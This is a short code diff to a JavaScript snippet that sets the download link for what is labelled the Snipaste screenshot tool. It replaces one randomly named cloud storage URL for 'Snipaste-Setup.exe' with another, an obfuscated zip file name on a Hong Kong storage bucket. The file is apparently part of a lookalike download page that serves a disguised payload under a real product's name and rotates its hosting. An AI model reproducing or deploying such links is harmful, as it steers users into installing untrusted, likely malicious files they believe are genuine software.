@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'https://goujedt.s3.us-east-005.backblazeb2.com/Snipaste-Setup.exe';
+    window.filename = 'https://djkvhn3jkvncnvj.oss-cn-hongkong.aliyuncs.com/Snipaste_stickvbd_tbdls_vju.zip';
 })();
